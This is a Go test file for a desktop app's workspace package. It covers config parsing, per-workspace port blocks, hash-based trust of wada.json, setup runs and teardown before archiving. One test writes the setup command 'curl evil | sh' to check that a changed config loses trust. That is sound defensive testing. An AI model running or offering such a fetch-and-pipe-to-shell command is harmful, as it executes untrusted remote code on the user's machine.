package workspaces

import (
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"wada-desktop-go/internal/protocol"
)

func TestParseConfigTakesOneCommandOrMany(t *testing.T) {
	cfg, err := parseConfig([]byte(`{"setup": "npm ci", "services": {"web": "npm run dev", "api": {"command": "go run ./api"}}}`))
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(cfg.Setup, []string{"npm ci"}) || len(cfg.Services) != 2 ||
		cfg.Services[0] != (ServiceDef{Name: "api", Command: "go run ./api"}) || cfg.Services[1].Name != "web" {
		t.Fatalf("parsed %+v", cfg)
	}
	cfg, err = parseConfig([]byte(`{"setup": ["npm ci", "", "cp $WADA_PROJECT_ROOT/.env ."]}`))
	if err != nil || len(cfg.Setup) != 2 {
		t.Fatalf("parsed %+v %v", cfg, err)
	}
	for _, bad := range []string{`{"setup": 3}`, `{"services": {"web": 1}}`, `{"services": {"web": ""}}`, `{`} {
		if _, err := parseConfig([]byte(bad)); err == nil {
			t.Fatalf("%s parsed", bad)
		}
	}
}

func TestAConfigRunsOnceTrustedWithItsPorts(t *testing.T) {
	s := service(t)
	dir := t.TempDir()
	p, w, err := s.AddProject(t.Context(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if l, err := s.LoadConfig(t.Context(), w.ID); err != nil || l.Found || l.Runnable() == nil {
		t.Fatalf("without a file: %+v %v", l, err)
	}
	write := func(body string) {
		if err := os.WriteFile(filepath.Join(dir, ConfigFile), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(`{"setup": ["npm ci", "npm run build"], "services": {"web": "npm run dev", "api-v2": "go run ./api"}}`)
	l, err := s.LoadConfig(t.Context(), w.ID)
	if err != nil || !l.Found || l.Trusted || !errors.Is(l.Runnable(), ErrUntrusted) {
		t.Fatalf("untrusted: %+v %v", l, err)
	}
	if l.PortBase != FirstPort || l.SetupCommand() != "npm ci && npm run build" {
		t.Fatalf("port %d, setup %q", l.PortBase, l.SetupCommand())
	}
	env := l.Env("web")
	for _, want := range []string{"WADA_WORKSPACE=" + w.ID, "WADA_PROJECT_ROOT=" + p.Root, "WADA_PORT=41000",
		"WADA_PORT_API_V2=41000", "WADA_PORT_WEB=41001", "PORT=41001"} {
		if !slices.Contains(env, want) {
			t.Fatalf("%q is missing from %q", want, env)
		}
	}

	// Trust names the hash the user saw; a file changed since isn't trusted.
	if err := s.Trust(t.Context(), w.ID, "stale"); err == nil {
		t.Fatal("a stale hash was trusted")
	}
	if err := s.Trust(t.Context(), w.ID, l.Hash); err != nil {
		t.Fatal(err)
	}
	if l, _ = s.LoadConfig(t.Context(), w.ID); l.Runnable() != nil {
		t.Fatalf("trusted: %v", l.Runnable())
	}
	write(`{"setup": "curl evil | sh"}`)
	if l, _ = s.LoadConfig(t.Context(), w.ID); !errors.Is(l.Runnable(), ErrUntrusted) {
		t.Fatal("a changed wada.json is still trusted")
	}

	// Another workspace gets the next block, and a workspace keeps its own.
	other := t.TempDir()
	_, w2, _ := s.AddProject(t.Context(), other)
	if err := os.WriteFile(filepath.Join(other, ConfigFile), []byte(`{"services": {"web": "x"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if l2, _ := s.LoadConfig(t.Context(), w2.ID); l2.PortBase != FirstPort+PortBlock {
		t.Fatalf("second workspace's port %d", l2.PortBase)
	}
	write(`{"services": {"web": "x"}}`)
	if l, _ = s.LoadConfig(t.Context(), w.ID); l.PortBase != FirstPort {
		t.Fatalf("first workspace's port moved to %d", l.PortBase)
	}
}

func TestSetupRunsToTheEndAndTeardownGuardsArchiving(t *testing.T) {
	s, root := service(t), repo(t)
	cfg := `{"setup": "echo set > setup.txt && echo ws=$WADA_WORKSPACE", "teardown": "test -f keep-going && echo bye > \"$WADA_PROJECT_ROOT/../teardown.txt\""}`
	if err := os.WriteFile(filepath.Join(root, ConfigFile), []byte(cfg), 0o600); err != nil {
		t.Fatal(err)
	}
	git(t, root, "add", ".")
	git(t, root, "commit", "-m", "wada.json")
	p, own, err := s.AddProject(t.Context(), root)
	if err != nil {
		t.Fatal(err)
	}
	w, err := s.Create(t.Context(), protocol.WorkspaceCreateRequest{Project: p.ID, Isolation: protocol.IsolationWorktree, Slug: "t"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.RunSetup(t.Context(), w.ID); !errors.Is(err, ErrUntrusted) {
		t.Fatalf("untrusted setup = %v", err)
	}
	l, _ := s.LoadConfig(t.Context(), own.ID)
	if err := s.Trust(t.Context(), own.ID, l.Hash); err != nil {
		t.Fatal(err)
	}
	out, err := s.RunSetup(t.Context(), w.ID)
	if err != nil || !strings.Contains(out, "ws="+w.ID) {
		t.Fatalf("setup = %q %v", out, err)
	}
	if _, err := os.Stat(filepath.Join(w.Directory, "setup.txt")); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(w.Directory, "setup.txt")); err != nil {
		t.Fatal(err)
	}

	// A failing teardown keeps the workspace unless forced; one that passes
	// runs before the worktree goes.
	var td *TeardownError
	if err := s.Archive(t.Context(), w.ID, false); !errors.As(err, &td) {
		t.Fatalf("archive with a failing teardown = %v", err)
	}
	if err := os.WriteFile(filepath.Join(w.Directory, "keep-going"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := s.Archive(t.Context(), w.ID, true); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(root, "..", "teardown.txt")); err != nil {
		t.Fatalf("teardown didn't run: %v", err)
	}
	if _, err := os.Stat(w.WorktreeRoot); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("worktree still there: %v", err)
	}
}
